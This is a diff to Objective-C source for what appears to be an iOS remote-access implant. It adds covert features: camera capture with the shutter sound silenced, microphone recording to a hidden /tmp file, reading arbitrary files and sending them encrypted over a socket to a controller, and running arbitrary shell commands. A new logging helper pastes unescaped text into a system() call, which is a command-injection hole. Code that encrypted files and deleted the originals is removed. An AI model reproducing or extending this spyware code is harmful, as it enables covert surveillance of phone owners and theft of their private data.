@@ -32,9 +32,38 @@ int sockfd;
     return result;
 }
 
--(void)sendData:(NSData *)data {
-    unsigned char *prepData = (unsigned char *)[data bytes];
-    write (sockfd, prepData, sizeof(data));
+-(void)receiveFileData:(NSString *)saveToPath :(long)fileSize {
+    [self blank];
+    long bsize = fileSize;
+    char buffer[bsize];
+    NSMutableData *data = [NSMutableData alloc];
+    //we use both chunks to make sure we never check an incomplete terminator string
+    NSString *lastchunk = @"";
+    NSString *thischunk = @"";
+    while(read (sockfd, &buffer, sizeof(buffer))) {
+        //append data
+        thischunk = [NSString stringWithFormat:@"%s",buffer];
+        [data appendBytes:[thischunk UTF8String] length:thischunk.length];
+        //detect terminator, decrypt data, write to file
+        memset(buffer,'\0',bsize);
+        if (!([[NSString stringWithFormat:@"%@%@",lastchunk,thischunk] rangeOfString:_terminator].location == NSNotFound)) {
+            //fuck this
+            NSString *datastr = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+            datastr = [datastr substringToIndex:[datastr length] - 16];
+            NSData *nsdataDecoded = [data initWithBase64EncodedString:datastr options:NSDataBase64DecodingIgnoreUnknownCharacters];
+            [nsdataDecoded writeToFile:saveToPath atomically:true];
+            break;
+        }
+        lastchunk = [NSString stringWithFormat:@"%s",buffer];
+    }
+    [self blank];
+}
+
+-(void)sendFileData:(NSData*)fileData {
+    NSData *encryptedData = [escryptor encryptNSData:self.skey :fileData];
+    [self sendString:[NSString stringWithFormat:@"%lu",(unsigned long)encryptedData.length]];
+    write (sockfd, [encryptedData bytes], encryptedData.length);
+    write (sockfd, [_terminator UTF8String], _terminator.length);
 }
 
 -(void)sendString:(NSString *)string {
@@ -62,7 +91,7 @@ int sockfd;
 
 //MARK: Camera
 
--(void)camera:(BOOL)isfront {
+-(NSData*)camera:(BOOL)isfront {
     NSDictionary *userInfo = [NSDictionary dictionaryWithObject:@"silenceShutter" forKey:@"cmd"];
     [_messagingCenter sendMessageName:@"commandWithNoReply" userInfo:userInfo];
     [self setupCaptureSession:isfront];
@@ -70,13 +99,14 @@ int sockfd;
     //this guy deserves a medal
     //http://stackoverflow.com/questions/22549020/capture-a-still-image-on-ios7-through-a-console-app
     __block BOOL done = NO;
+    __block NSData *pictureData;
     [self captureWithBlock:^(NSData *imageData) {
         done = YES;
-        [self sendString:[NSString stringWithFormat:@"%lu",(unsigned long)imageData.length]];
-        [self sendEncryptedFile:imageData];
+        pictureData = imageData;
     }];
     while (!done)
     [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1]];
+    return pictureData;
 }
 
 -(AVCaptureDevice *)frontFacingCameraIfAvailable
@@ -116,9 +146,7 @@ int sockfd;
     else
         device = [self backFacingCameraIfAvailable];
     
-    
     AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device error:&error];
-
     [self.session addInput:input];
     self.stillImageOutput = [[AVCaptureStillImageOutput alloc] init];
     NSDictionary *outputSettings = [[NSDictionary alloc] initWithObjectsAndKeys: AVVideoCodecJPEG, AVVideoCodecKey, nil];
@@ -126,7 +154,6 @@ int sockfd;
     [outputSettings release];
     [self.session addOutput:self.stillImageOutput];
     [self.session startRunning];
-    
 }
 
 - (void)captureWithBlock:(void(^)(NSData* imageData))block
@@ -163,9 +190,11 @@ int sockfd;
         return;
     }
     if ([arg isEqual:@"record"]) {
+        NSString *file = @"/tmp/.avatmp";
+        [_fileManager removeItemAtPath:file error:NULL];
         [[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryRecord withOptions:AVAudioSessionCategoryOptionMixWithOthers error:nil];
         
-        NSString *destinationString = @"/tmp/.esmic.aac";
+        NSString *destinationString = file;
         NSURL *destinationURL = [NSURL fileURLWithPath: destinationString];
         NSDictionary *mysettings = @{AVFormatIDKey: @(kAudioFormatMPEG4AAC),
                                      AVEncoderAudioQualityKey: @(AVAudioQualityHigh),
@@ -183,10 +212,10 @@ int sockfd;
     else if ([arg isEqualToString:@"stop"]) {
         if ([recorder isRecording]) {
             [recorder stop];
-            [self download:@"/tmp/.esmic.aac"];
+            [self sendString:@"1"];
         }
         else {
-            [self sendString:@"audio file not found"];
+            [self sendString:@"Not currently recording"];
         }
     }
     else {
@@ -313,97 +342,21 @@ int sockfd;
     write(sockfd, [_terminator UTF8String], _terminator.length);
 }
 
--(void)download:(NSString *)arg {
-    @autoreleasepool {
-        NSString *filepath = @"";
-        if (![arg isEqualToString:@""]) {
-            filepath = arg;
-        }
-        BOOL isdir;
-        if ([_fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
-            if (isdir) {
-                [self sendString:[NSString stringWithFormat:@"%@ is a directory",filepath]];
-            }
-            else {
-                NSData *filedata = [_fileManager contentsAtPath:filepath];
-                [self sendString:[NSString stringWithFormat:@"%lu",(unsigned long)filedata.length]];
-                [self sendEncryptedFile:filedata];
-            }
-        }
-        else {
-            [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]];
-        }
-    }
-}
-
-
-/*
--(void)encryptFile:(NSArray *)args {
+-(NSData*)filePathToData:(NSString *)arg {
     BOOL isdir;
-    NSString *filepath = @"";
-    if (args.count > 2) {
-        filepath = [self forgetFirst:args];
-        NSString *last = [NSString stringWithFormat:@" %@",args[args.count -1]];
-        filepath = [filepath stringByReplacingOccurrencesOfString:last withString:@""];
-    }
-    else {
-        [self sendString:@"Usage: encrypt file password1234"];
-        return;
-    }
-    
-    if ([_fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
+    if ([_fileManager fileExistsAtPath:arg isDirectory:&isdir]) {
         if (isdir) {
-            [self sendString:[NSString stringWithFormat:@"%@ is a directory",filepath]];
+            [self sendString:[NSString stringWithFormat:@"%@ is a directory",arg]];
         }
         else {
-            NSData *filedata = [_fileManager contentsAtPath:filepath];
-            [self sendString:[NSString stringWithFormat:@"Encrypting %@.aes with 256 Bit AES",filepath]];
-            filedata = [filedata AES256EncryptWithKey:args[args.count -1]];
-            [filedata writeToFile:[NSString stringWithFormat:@"%@.aes",filepath] atomically:true];
-            [_fileManager removeItemAtPath:filepath error:nil];
+            return [_fileManager contentsAtPath:arg];
         }
     }
     else {
-        [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]];
+        [self sendString:[NSString stringWithFormat:@"%@ not found",arg]];
     }
+    return NULL;
 }
-
--(void)decryptFile:(NSArray *)args {
-    BOOL isdir;
-    NSString *filepath = @"";
-    if (args.count > 2) {
-        filepath = [self forgetFirst:args];
-        NSString *last = [NSString stringWithFormat:@" %@",args[args.count -1]];
-        filepath = [filepath stringByReplacingOccurrencesOfString:last withString:@""];
-    }
-    else {
-        [self sendString:@"Usage: decrypt file.aes password1234"];
-        return;
-    }
-    
-    if ([_fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
-        if (isdir) {
-            [self sendString:[NSString stringWithFormat:@"%@ is a directory",filepath]];
-        }
-        else {
-            if ([filepath containsString:@".aes"]) {
-                NSData *filedata = [_fileManager contentsAtPath:filepath];
-                [self sendString:[NSString stringWithFormat:@"Decrypting %@",filepath]];
-                filedata = [filedata AES256DecryptWithKey:args[args.count -1]];
-                [filedata writeToFile:[filepath substringToIndex:[filepath length] - 4] atomically:true];
-                [_fileManager removeItemAtPath:filepath error:nil];
-                
-            }
-            else {
-                [self sendString:[NSString stringWithFormat:@"Only supports .aes files"]];
-            }
-        }
-    }
-    else {
-        [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]];
-    }
-}
-*/
 
 //MARK: Misc
 
@@ -424,11 +377,18 @@ int sockfd;
     [self sendString:result];
 }
 
+-(void)eslog:(NSString *)str {
+    #pragma GCC diagnostic push
+    #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
+    system([[NSString stringWithFormat:@"echo '%@' >> /tmp/esplog",str] UTF8String]);
+    #pragma GCC diagnostic pop
+}
+
 -(void)exec:(NSString *)command {
-#pragma GCC diagnostic push
-#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
+    #pragma GCC diagnostic push
+    #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
     system([command UTF8String]);
-#pragma GCC diagnostic pop
+    #pragma GCC diagnostic pop
 }
 
 -(void)vibrate {
